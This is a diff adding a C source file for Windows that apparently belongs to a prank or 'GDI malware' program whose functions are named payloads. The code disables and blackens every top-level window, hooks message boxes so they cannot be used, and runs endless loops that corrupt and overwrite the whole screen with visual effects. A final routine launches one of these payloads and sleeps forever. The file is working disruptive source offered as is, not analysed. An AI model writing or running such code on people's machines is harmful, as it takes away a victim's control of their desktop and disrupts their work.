@@ -1,0 +1,241 @@
+#include "stuff.h"
+
+LRESULT CALLBACK MsgBoxProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	HWND msgBoxWnd = (HWND)wParam;
+
+	SetWindowTextW(GetDlgItem(msgBoxWnd, IDYES), SigmaSym);
+	SetWindowTextW(GetDlgItem(msgBoxWnd, IDNO), SigmaSym);
+	EnableWindow(msgBoxWnd, false);
+
+	return CallNextHookEx(0, nCode, wParam, lParam);
+}
+
+BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
+	HDC hdc = GetDC(hWnd);
+	RECT rekt;	
+
+	GetWindowRect(hWnd, &rekt);
+	BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, BLACKNESS);
+	EnableWindow(hWnd, false);
+
+	ReleaseDC(hWnd, hdc);
+
+	return 1;
+}
+
+DWORD WINAPI MsgBoxSpam() {
+	HHOOK MsgBox = SetWindowsHookExW(WH_CBT, MsgBoxProc, 0, GetCurrentThreadId());
+	MessageBoxW(0, SigmaSym, SigmaSym, MB_ICONERROR | MB_YESNO | MB_RTLREADING | MB_SETFOREGROUND);
+	UnhookWindowsHookEx(MsgBox);
+
+	return 0;
+}
+
+void WINAPI WindowGlitch(int nTime) {
+	while (true) {
+		EnumWindows(EnumWindowsProc, 0);
+		Sleep(100);
+	}
+}
+
+DWORD WINAPI Payload1() {
+	while (true) {
+		HDC hdc = GetDC(0);
+		HDC hdcMem = CreateCompatibleDC(hdc);
+		HBITMAP bmp = CreateCompatibleBitmap(hdc, x, y);
+
+		SelectObject(hdcMem, bmp);
+		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+		BitBlt(hdc, rand() % 3, rand() % 3, x, y, hdcMem, rand() % 3, rand() % 3, SRCCOPY);
+
+		BLENDFUNCTION blend = { 0, 0, 100, 0 };
+		AlphaBlend(hdc, 0, 0, x, y, hdcMem, 0, 0, x, y, blend);
+
+		ReleaseDC(0, hdc);
+		DeleteDC(hdcMem); DeleteObject(bmp);
+		Sleep(100);
+	}
+}
+
+DWORD WINAPI Payload3() {
+	while (true) {
+		for (int i = 0; i < 355; i += 5) {
+			HDC hdc = GetDC(0);
+
+			SelectObject(hdc, CreateSolidBrush(Hue(i)));
+			BitBlt(hdc, 1, 0, x, y, hdc, 0, 0, SRCRNBW);
+			BitBlt(hdc, 0, 1, x, y, hdc, 0, 0, SRCRNBW);
+			BitBlt(hdc, -1, 0, x, y, hdc, 0, 0, SRCRNBW);
+			BitBlt(hdc, 0, -1, x, y, hdc, 0, 0, SRCRNBW);
+
+			ReleaseDC(0, hdc);
+			Sleep(10);
+		}
+	}
+}
+
+DWORD WINAPI Payload_4() {
+	int xs = 0;
+	int ys = 0;
+
+	while (true) {
+		for (int i = 0; i < 358; i += 2) {
+			HDC hdc = GetDC(0);
+
+			xs = rand() % x;
+			ys = rand() % y;
+			StretchBlt(hdc, xs - 2, ys - 2, 204, 204, hdc, xs, ys, 200, 200, SRCCOPY);
+
+			ReleaseDC(0, hdc);
+			Sleep(10);
+		}
+	}
+}
+
+DWORD WINAPI Payload5() {
+	int color = 0;
+
+	while (true) {
+		int xs = random() % x;
+		int ys = random() % y;
+
+		for (int i = 0; i < x; i += 50) {
+			HDC hdc = GetDC(0);
+
+			HRGN circle = CreateEllipticRgn(xs - i, ys - i, xs + i, ys + i);
+			SelectClipRgn(hdc, circle);
+
+			SelectObject(hdc, CreateSolidBrush(Hue(color)));
+			BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, MERGECOPY);
+			color += 2;
+
+			switch (color) {
+			case 358:
+				color = 0;
+				break;
+			}
+
+			ReleaseDC(0, hdc);
+			Sleep(10);
+		}
+		InvalidateRect(0, 0, 0);
+		Sleep(200);
+	}
+}
+
+DWORD WINAPI Payload() {
+	int xs = 0, xf = 2;
+	int ys = 0, yf = 3;
+
+	CURSORINFO cur;
+
+	while (true) {
+		HDC hdc = GetDC(0);
+
+		cur.cbSize = sizeof(CURSORINFO);
+		GetCursorInfo(&cur);
+		DrawIcon(hdc, xs, ys, cur.hCursor);
+		xs += xf;
+		ys += yf;
+
+		if (xs <= 0 || xs >= x) {
+			xf = -xf;
+		}
+		if (ys <= 0 || ys >= y) {
+			yf = -yf;
+		}
+
+		ReleaseDC(0, hdc);
+		Sleep(1);
+	}
+}
+
+DWORD WINAPI Payload2() {
+	PRGBTRIPLE prgb = 0;
+	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };
+
+	while (true) {
+		HDC hdc = GetDC(0);
+		HDC hdcMem = CreateCompatibleDC(hdc);
+		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);
+
+		SelectObject(hdcMem, DIB);
+		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+
+		for (int i = 0; i < x * y; i++) {
+			prgb[i].rgbtRed *= 3;
+			prgb[i].rgbtGreen = 0;
+			prgb[i].rgbtBlue *= 3;
+		}
+		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);
+
+		ReleaseDC(0, hdc);
+		DeleteDC(hdcMem); DeleteObject(DIB);
+		Sleep(100);
+	}
+}
+
+DWORD WINAPI Payload_6() {
+	PRGBTRIPLE prgb;
+	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };
+
+	int wave = 0;
+
+	while (true) {
+		HDC hdc = GetDC(0);
+		HDC hdcMem = CreateCompatibleDC(hdc);
+		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);
+
+		SelectObject(hdcMem, DIB);
+		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+
+		for (int i = 0; i < x * y; i++) {
+			prgb[i].rgbtRed = (i * (i >> 9)) + wave;
+			prgb[i].rgbtGreen = (i * (i >> 9)) + wave;
+			prgb[i].rgbtBlue = 0;
+		}
+		wave += 10;
+		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);
+
+		ReleaseDC(0, hdc);
+		DeleteDC(hdcMem); DeleteObject(DIB);
+		Sleep(30);
+	}
+}
+
+DWORD WINAPI Payload_7() {
+	PRGBTRIPLE prgb;
+	BITMAPINFO bmp = { sizeof(BITMAPINFOHEADER), x, y, 1, 24 };
+
+	int wave = 0;
+	double j = 0;
+
+	while (true) {
+		HDC hdc = GetDC(0);
+		HDC hdcMem = CreateCompatibleDC(hdc);
+		HBITMAP DIB = CreateDIBSection(hdc, &bmp, 0, (void**)&prgb, 0, 0);
+
+		SelectObject(hdcMem, DIB);
+		BitBlt(hdcMem, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+
+		for (int i = 0; i < x * y; i++) {
+			prgb[i].rgbtRed = -(i + wave);
+			prgb[i].rgbtGreen += 10;
+			prgb[i].rgbtBlue = i + wave;
+		}
+		wave += sin(j) * 16;
+		j += 0.06;
+
+		BitBlt(hdc, 0, 0, x, y, hdcMem, 0, 0, SRCCOPY);
+
+		ReleaseDC(0, hdc);
+		DeleteDC(hdcMem); DeleteObject(DIB);
+		Sleep(30);
+	}
+}
+
+void payloads() {
+	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Payload_4, 0, 0, 0));
+
+	Sleep(-1);
+}
